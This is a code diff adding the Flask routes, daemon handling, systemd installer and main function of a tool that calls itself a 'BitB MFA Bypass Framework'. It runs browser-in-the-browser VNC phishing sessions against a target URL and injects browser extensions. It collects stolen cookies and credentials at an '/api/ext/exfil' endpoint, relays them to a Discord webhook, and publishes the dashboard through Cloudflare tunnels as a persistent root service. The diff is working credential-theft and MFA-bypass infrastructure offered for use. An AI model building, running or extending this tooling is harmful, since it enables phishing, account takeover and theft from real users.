@@ -1287,7 +1287,566 @@ INDEX_HTML = """<!DOCTYPE html>
 </body>
 </html>"""
 
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 8: FLASK ROUTES (continued)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@app.route("/")
+def index():
+    return render_template_string(INDEX_HTML)
+
+
+@app.route("/api/tunnel")
+def api_tunnel():
+    return jsonify({"url": tunnel_manager.get_api_url() if tunnel_manager else None,
+                    "enabled": CONFIG["cloudflare_tunnel_enabled"]})
+
+
+# ─── Session Routes ─────────────────────────────────────────────────────────
+
+@app.route("/api/session", methods=["POST"])
+def api_create_session():
+    data = request.get_json()
+    user_id = data.get("user_id", f"user_{uuid.uuid4().hex[:6]}")
+    target_url = data.get("target_url")
+    try:
+        session = sm.create_session(user_id, target_url)
+        socketio.emit("session_update", {})
+        tunnel_url = None
+        if CONFIG["cloudflare_tunnel_enabled"] and tunnel_manager:
+            tunnel_url = tunnel_manager.start_vnc_tunnel(session["vnc_port"], session["session_id"])
+            if tunnel_url:
+                session["tunnel_url"] = tunnel_url
+        return jsonify({
+            "status": "ok",
+            "session_id": session["session_id"],
+            "vnc_url": session["vnc_url"],
+            "vnc_port": session["vnc_port"],
+            "tunnel_url": tunnel_url,
+            "extensions_injected": session["extensions_injected"]
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/sessions", methods=["GET"])
+def api_list_sessions():
+    with sm.lock:
+        sessions = list(sm.sessions.values())
+    return jsonify({
+        "count": len(sessions),
+        "sessions": [{
+            "session_id": s["session_id"],
+            "user_id": s["user_id"],
+            "vnc_port": s["vnc_port"],
+            "vnc_url": s["vnc_url"],
+            "tunnel_url": s.get("tunnel_url"),
+            "created_at": s["created_at"],
+            "extensions_injected": s["extensions_injected"],
+        } for s in sessions]
+    })
+
+
+@app.route("/api/session/<session_id>", methods=["GET"])
+def api_get_session(session_id):
+    session = sm.get_session(session_id)
+    if not session:
+        return jsonify({"error": "Not found"}), 404
+    return jsonify(session)
+
+
+@app.route("/api/session/<session_id>", methods=["DELETE"])
+def api_destroy_session(session_id):
+    sm.destroy_session(session_id)
+    socketio.emit("session_update", {})
+    return jsonify({"status": "destroyed"})
+
+
+# ─── Extension Routes ───────────────────────────────────────────────────────
+
+@app.route("/api/ext/status", methods=["GET"])
+def api_ext_status():
+    available = list(ext_manager.available_extensions.keys()) if ext_manager else []
+    return jsonify({
+        "extensions": available,
+        "inject_enabled": CONFIG["inject_extensions"],
+        "poll_interval": CONFIG["extension_poll_interval"],
+        "count": len(available)
+    })
+
+
+@app.route("/api/ext/rebuild", methods=["POST"])
+def api_ext_rebuild():
+    if not ext_manager:
+        return jsonify({"status": "error", "message": "Extension manager not available"}), 500
+    try:
+        built = ext_manager.build_all()
+        return jsonify({
+            "status": "ok",
+            "built": list(built.keys()),
+            "message": f"Built {len(built)} extensions: {', '.join(built.keys())}"
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/ext/exfil", methods=["POST"])
+def api_ext_exfil():
+    """Endpoint for browser extensions to push exfiltrated data."""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({"status": "error", "message": "No data"}), 400
+        
+        ext_receiver.receive(data)
+        
+        # Emit to dashboard
+        ext_type = data.get("type", "unknown")
+        metadata = data.get("metadata", {})
+        url = metadata.get("url", "unknown")[:50]
+        socketio.emit("ext_exfil_event", {"type": ext_type, "msg": f"[{ext_type}] {url}"})
+        
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        log.error(f"Extension exfil receive error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+# ─── Access Control Routes ───────────────────────────────────────────────────
+
+@app.route("/api/access/status", methods=["GET"])
+def api_access_status():
+    if ip_access_controller:
+        return jsonify(ip_access_controller.get_status())
+    return jsonify({"enabled": False, "error": "Access control not initialized"})
+
+
+@app.route("/api/access/whitelist", methods=["POST"])
+def api_access_whitelist_add():
+    data = request.get_json()
+    ip = data.get("ip", "")
+    if not ip:
+        return jsonify({"status": "error", "message": "IP address required"}), 400
+    if ip_access_controller and ip_access_controller.add_to_whitelist(ip):
+        return jsonify({"status": "ok", "message": f"Added {ip} to whitelist"})
+    return jsonify({"status": "error", "message": f"Invalid IP: {ip}"}), 400
+
+
+@app.route("/api/access/whitelist/<path:ip>", methods=["DELETE"])
+def api_access_whitelist_remove(ip):
+    if ip_access_controller and ip_access_controller.remove_from_whitelist(ip):
+        return jsonify({"status": "ok", "message": f"Removed {ip} from whitelist"})
+    return jsonify({"status": "error", "message": f"IP {ip} not found"}), 404
+
+
+@app.route("/api/access/blacklist", methods=["POST"])
+def api_access_blacklist_add():
+    data = request.get_json()
+    ip = data.get("ip", "")
+    if not ip:
+        return jsonify({"status": "error", "message": "IP address required"}), 400
+    if ip_access_controller and ip_access_controller.add_to_blacklist(ip):
+        return jsonify({"status": "ok", "message": f"Added {ip} to blacklist"})
+    return jsonify({"status": "error", "message": f"Invalid IP: {ip}"}), 400
+
+
+@app.route("/api/access/blacklist/<path:ip>", methods=["DELETE"])
+def api_access_blacklist_remove(ip):
+    if ip_access_controller and ip_access_controller.remove_from_blacklist(ip):
+        return jsonify({"status": "ok", "message": f"Removed {ip} from blacklist"})
+    return jsonify({"status": "error", "message": f"IP {ip} not found"}), 404
+
+
+@app.route("/api/access/session/<session_id>", methods=["POST"])
+def api_access_session_set(session_id):
+    data = request.get_json()
+    whitelist = data.get("whitelist", [])
+    blacklist = data.get("blacklist", [])
+    mode = data.get("mode", "whitelist")
+    if ip_access_controller and ip_access_controller.set_session_access(session_id, whitelist, blacklist, mode):
+        return jsonify({"status": "ok", "message": f"Session {session_id[:16]} access set to {mode}"})
+    return jsonify({"status": "error"}), 400
+
+
+@app.route("/api/access/session/<session_id>", methods=["DELETE"])
+def api_access_session_remove(session_id):
+    if ip_access_controller:
+        ip_access_controller.remove_session_access(session_id)
+    return jsonify({"status": "ok"})
+
+
+@app.route("/api/access/session/<session_id>/check", methods=["POST"])
+def api_access_session_check(session_id):
+    data = request.get_json()
+    client_ip = data.get("ip", request.remote_addr or "0.0.0.0")
+    allowed = True
+    if ip_access_controller:
+        session = sm.get_session(session_id)
+        port = session.get("vnc_port", 0) if session else 0
+        allowed = ip_access_controller.check_session_access(session_id, client_ip, port)
+    return jsonify({
+        "session_id": session_id[:16],
+        "client_ip": client_ip,
+        "allowed": allowed,
+        "action": "allow" if allowed else "deny"
+    })
+
+
+# ─── Daemon Routes ──────────────────────────────────────────────────────────
+
+@app.route("/api/daemon/status", methods=["GET"])
+def api_daemon_status():
+    if daemon_manager:
+        return jsonify(daemon_manager.get_status())
+    return jsonify({"running": False, "message": "Daemon manager not initialized"})
+
+
+@app.route("/api/daemon/restart", methods=["POST"])
+def api_daemon_restart():
+    if daemon_manager:
+        daemon_manager.set_restart_flag()
+        threading.Thread(target=daemon_manager.initiate_shutdown, daemon=True).start()
+        return jsonify({"status": "ok", "message": "Restart scheduled"})
+    return jsonify({"status": "error"}), 500
+
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# SECTION 8: FLASK ROUTES
-# ═════════════════════════════════════════════
+# SECTION 9: SHUTDOWN & RELOAD HANDLERS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def shutdown_handler():
+    """Called during graceful shutdown."""
+    log.info("🛑 Executing shutdown handler...")
+    if 'tunnel_manager' in globals() and tunnel_manager:
+        tunnel_manager.stop_all_tunnels()
+    if ip_access_controller:
+        ip_access_controller.cleanup()
+    if 'sm' in globals() and sm:
+        with sm.lock:
+            session_ids = list(sm.sessions.keys())
+        for sid in session_ids:
+            try:
+                sm.destroy_session(sid)
+            except:
+                pass
+    log.info("✅ Shutdown handler complete")
+
+
+def reload_config():
+    """Reload configuration (called on SIGHUP)."""
+    log.info("🔄 Reloading configuration...")
+    config_path = os.environ.get("BITB_CONFIG", "/data/bitb/config.json")
+    if os.path.exists(config_path):
+        try:
+            with open(config_path) as f:
+                new_config = json.load(f)
+            CONFIG.update(new_config)
+            log.info("✅ Configuration reloaded")
+        except Exception as e:
+            log.error(f"Failed to reload config: {e}")
+    if ip_access_controller:
+        ip_access_controller._apply_all_rules()
+    if daemon_manager:
+        daemon_manager.systemd_reloading()
+
+
+def dump_status():
+    """Dump status information (called on SIGUSR1)."""
+    log.info("📊 Status dump:")
+    sessions_count = len(sm.sessions) if 'sm' in globals() and sm else 0
+    log.info(f"  Active sessions: {sessions_count}")
+    if ip_access_controller:
+        status = ip_access_controller.get_status()
+        log.info(f"  Access control: {'Enabled' if status['enabled'] else 'Disabled'}")
+        log.info(f"  Whitelist entries: {len(status['global_whitelist'])}")
+        log.info(f"  Blacklist entries: {len(status['global_blacklist'])}")
+        log.info(f"  Session rules: {len(status['session_access'])}")
+    if global_tunnel_url:
+        log.info(f"  Public URL: {global_tunnel_url}")
+
+
+def _watchdog_loop():
+    """Periodic watchdog ping for systemd."""
+    while True:
+        time.sleep(15)
+        if daemon_manager and not daemon_manager.is_shutdown_requested():
+            daemon_manager.systemd_watchdog()
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 10: SYSTEMD SERVICE INSTALL
+# ═══════════════════════════════════════════════════════════════════════════════
+
+SYSTEMD_SERVICE_CONTENT = """[Unit]
+Description=BitB MFA Bypass Framework v2.1
+Documentation=https://github.com/bitb-framework
+After=network.target docker.service
+Wants=docker.service
+Requires=docker.service
+
+[Service]
+Type=notify
+ExecStartPre=/usr/bin/env bash -c 'while ! docker info >/dev/null 2>&1; do sleep 1; done'
+ExecStart=/usr/local/bin/bitb --daemon
+ExecReload=/bin/kill -HUP $MAINPID
+ExecStop=/bin/kill -TERM $MAINPID
+Restart=on-failure
+RestartSec=10
+TimeoutStartSec=120
+TimeoutStopSec=30
+User=root
+Group=root
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_SYS_ADMIN
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW
+NoNewPrivileges=false
+ProtectSystem=full
+ProtectHome=false
+PrivateTmp=false
+LimitNOFILE=65536
+LimitNPROC=4096
+KillMode=process
+SendSIGKILL=no
+WatchdogSec=30
+NotifyAccess=all
+Environment=BITB_HOME=/data/bitb
+Environment=BITB_CONFIG=/data/bitb/config.json
+Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[Install]
+WantedBy=multi-user.target
+"""
+
+
+def cmd_install_service():
+    """Install the BitB systemd service."""
+    svc_path = Path("/etc/systemd/system/bitb.service")
+    svc_path.parent.mkdir(parents=True, exist_ok=True)
+    svc_path.write_text(SYSTEMD_SERVICE_CONTENT)
+    subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
+    
+    # Create symlink
+    script_path = Path(__file__).resolve()
+    target = Path("/usr/local/bin/bitb")
+    if not target.exists():
+        try:
+            target.symlink_to(script_path)
+        except:
+            pass
+    
+    print("✅ Systemd service installed at /etc/systemd/system/bitb.service")
+    print("✅ Symlink: /usr/local/bin/bitb ->", script_path)
+    print()
+    print("Manage with:")
+    print("  sudo systemctl enable bitb    # Auto-start on boot")
+    print("  sudo systemctl start bitb     # Start now")
+    print("  sudo systemctl status bitb    # Check status")
+    print("  sudo journalctl -u bitb -f    # Follow logs")
+
+
+def cmd_uninstall_service():
+    """Remove the BitB systemd service."""
+    subprocess.run(["systemctl", "stop", "bitb"], capture_output=True, timeout=10)
+    subprocess.run(["systemctl", "disable", "bitb"], capture_output=True, timeout=10)
+    Path("/etc/systemd/system/bitb.service").unlink(missing_ok=True)
+    subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
+    Path("/usr/local/bin/bitb").unlink(missing_ok=True)
+    print("✅ Systemd service uninstalled")
+
+
+def cmd_status_service():
+    """Show service status."""
+    try:
+        result = subprocess.run(["systemctl", "status", "bitb", "--no-pager"],
+                                capture_output=True, text=True, timeout=10)
+        print(result.stdout)
+    except:
+        pass
+    pf = Path(CONFIG["pid_file"])
+    if pf.exists():
+        try:
+            print(f"📝 PID file: {pf} (PID: {pf.read_text().strip()})")
+        except:
+            print(f"📝 PID file: {pf} (stale)")
+    else:
+        print("📝 PID file: Not running")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 11: MAIN FUNCTION
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def main():
+    global discord_exfil, ext_manager, ext_receiver, sm, tunnel_manager
+    global ip_access_controller, daemon_manager, global_tunnel_url
+    
+    parser = argparse.ArgumentParser(
+        description="BitB MFA Bypass Framework v2.1",
+        epilog="Service commands: --install, --uninstall, --status, --enable, --disable, --daemon"
+    )
+    parser.add_argument("--install", action="store_true", help="Install systemd service")
+    parser.add_argument("--uninstall", action="store_true", help="Remove systemd service")
+    parser.add_argument("--status", action="store_true", help="Check service status")
+    parser.add_argument("--enable", action="store_true", help="Enable auto-start on boot")
+    parser.add_argument("--disable", action="store_true", help="Disable auto-start")
+    parser.add_argument("--daemon", action="store_true", help="Run as daemon (for systemd)")
+    parser.add_argument("--config", type=str, help="Path to config file (JSON)")
+    parser.add_argument("--port", type=int, help="API server port")
+    parser.add_argument("--target", type=str, help="Target URL")
+    args = parser.parse_args()
+    
+    if args.install:
+        cmd_install_service()
+        return
+    if args.uninstall:
+        cmd_uninstall_service()
+        return
+    if args.enable:
+        subprocess.run(["systemctl", "enable", "bitb"], timeout=10)
+        print("✅ BitB service enabled on boot")
+        return
+    if args.disable:
+        subprocess.run(["systemctl", "disable", "bitb"], timeout=10)
+        print("✅ BitB service disabled from auto-start")
+        return
+    if args.status:
+        cmd_status_service()
+        return
+    
+    if args.config:
+        try:
+            with open(args.config) as f:
+                CONFIG.update(json.load(f))
+        except Exception as e:
+            print(f"❌ Failed to load config: {e}")
+            sys.exit(1)
+    if args.port:
+        CONFIG["listen_port_api"] = args.port
+    if args.target:
+        CONFIG["target_url"] = args.target
+    if args.daemon:
+        CONFIG["daemon_enabled"] = True
+    
+    # ─── Initialize Daemon ─────────────────────────────────────────────────
+    daemon_manager = DaemonManager(shutdown_callback=shutdown_handler)
+    daemon_manager.set_start_time()
+    
+    if daemon_manager.check_running():
+        print("❌ BitB is already running. Use 'sudo systemctl restart bitb'")
+        sys.exit(1)
+    
+    daemon_manager.write_pid_file()
+    daemon_manager.setup_signal_handlers()
+    daemon_manager.set_reload_callback(reload_config)
+    daemon_manager.set_status_callback(dump_status)
+    
+    # ─── Create Directories ────────────────────────────────────────────────
+    for d in [CONFIG["session_dir"], CONFIG["exfil_dir"],
+              f"{CONFIG['exfil_dir']}/extensions/cookies",
+              f"{CONFIG['exfil_dir']}/extensions/credentials",
+              CONFIG["log_dir"], CONFIG["access_control_dir"]]:
+        os.makedirs(d, exist_ok=True)
+    
+    # ─── Initialize Discord ───────────────────────────────────────────────
+    discord_exfil = DiscordExfiltrator(CONFIG["discord_webhook_url"])
+    
+    # ─── Initialize Extension Manager ─────────────────────────────────────
+    if HAS_EXT_MANAGER:
+        try:
+            ext_manager = ExtensionManager()
+            if CONFIG["inject_extensions"]:
+                log.info("🧩 Building browser extensions...")
+                ext_manager.build_all()
+        except Exception as e:
+            log.warning(f"Extension manager init failed: {e}")
+            ext_manager = None
+    
+    # ─── Initialize Receiver ──────────────────────────────────────────────
+    ext_receiver = ExtensionExfilReceiver(discord=discord_exfil)
+    
+    # ─── Initialize Session Manager ───────────────────────────────────────
+    sm = SessionManager(discord_exfiltrator=discord_exfil, ext_manager=ext_manager)
+    
+    # ─── Initialize Tunnels ───────────────────────────────────────────────
+    tunnel_manager = CloudflareTunnelManager()
+    
+    # ─── Initialize Access Control ────────────────────────────────────────
+    if CONFIG["access_control_enabled"]:
+        log.info("🔒 Initializing IP access control...")
+        ip_access_controller = IPAccessController(chain_prefix=CONFIG["access_control_chain"])
+        if CONFIG["auto_whitelist_local"]:
+            for cidr in ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]:
+                ip_access_controller.add_to_whitelist(cidr)
+        ip_access_controller.initialize()
+    
+    # ─── Banner ────────────────────────────────────────────────────────────
+    log.info("=" * 70)
+    log.info("  BitB MFA Bypass Framework v2.1 — Enterprise Edition")
+    log.info(f"  Target: {CONFIG['target_url']}")
+    log.info(f"  Extensions: {'✅ ENABLED' if CONFIG['inject_extensions'] else '❌ DISABLED'}")
+    log.info(f"  Access Control: {'✅ ENABLED' if CONFIG['access_control_enabled'] else '❌ DISABLED'}")
+    log.info(f"  Daemon Mode: {'✅ ACTIVE' if CONFIG['daemon_enabled'] else '❌ Foreground'}")
+    log.info(f"  Discord: {'✅ Configured' if CONFIG['discord_webhook_url'] != 'YOUR_DISCORD_WEBHOOK_URL_HERE' else '⚠️ NOT CONFIGURED'}")
+    log.info(f"  Tunnels: {'Enabled' if CONFIG['cloudflare_tunnel_enabled'] else 'Disabled'}")
+    log.info("=" * 70)
+    
+    # ─── Start API Server ─────────────────────────────────────────────────
+    server = make_server(CONFIG["listen_host"], CONFIG["listen_port_api"], app, threaded=True)
+    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
+    server_thread.start()
+    log.info(f"✅ API server listening on {CONFIG['listen_host']}:{CONFIG['listen_port_api']}")
+    time.sleep(0.5)
+    
+    # ─── Start Tunnel ─────────────────────────────────────────────────────
+    if CONFIG["cloudflare_tunnel_enabled"]:
+        global_tunnel_url = tunnel_manager.start_api_tunnel(CONFIG["listen_port_api"])
+        if global_tunnel_url:
+            log.info(f"🌐  PUBLIC URL: {global_tunnel_url}")
+            if discord_exfil:
+                discord_exfil.send_alert(
+                    f"🚀 **BitB Framework v2.1 Online**\\nDashboard: {global_tunnel_url}\\nTarget: {CONFIG['target_url']}",
+                    level="success"
+                )
+    
+    # ─── Final Info ────────────────────────────────────────────────────────
+    log.info("=" * 70)
+    log.info(f"  Local:  http://{CONFIG['listen_host']}:{CONFIG['listen_port_api']}")
+    if global_tunnel_url:
+        log.info(f"  Public: {global_tunnel_url}")
+    log.info(f"  Access: {'🛡️  IP Restricted' if CONFIG['access_control_enabled'] else '🌍 Open'}")
+    log.info("  Ctrl+C to stop")
+    log.info("=" * 70)
+    
+    # Notify systemd we're ready
+    daemon_manager.systemd_ready()
+    
+    # ─── Main Loop ────────────────────────────────────────────────────────
+    try:
+        if CONFIG["daemon_enabled"]:
+            watchdog_thread = threading.Thread(target=_watchdog_loop, daemon=True)
+            watchdog_thread.start()
+        
+        while not daemon_manager.is_shutdown_requested():
+            time.sleep(1)
+            
+    except KeyboardInterrupt:
+        log.info("🛑 Keyboard interrupt received")
+    finally:
+        log.info("🛑 Shutting down BitB...")
+        if CONFIG["cloudflare_tunnel_enabled"] and tunnel_manager:
+            tunnel_manager.stop_all_tunnels()
+        if ip_access_controller:
+            ip_access_controller.cleanup()
+        server.shutdown()
+        daemon_manager.remove_pid_file()
+        
+        if daemon_manager.should_restart():
+            log.info("🔄 Restart flag detected — restarting...")
+            daemon_manager.clear_restart_flag()
+            os.execv(sys.executable, [sys.executable, __file__] + 
+                    (["--daemon"] if CONFIG["daemon_enabled"] else []) + sys.argv[1:])
+        
+        log.info("👋 Goodbye!")
+
+
+if __name__ == "__main__":
+    main()
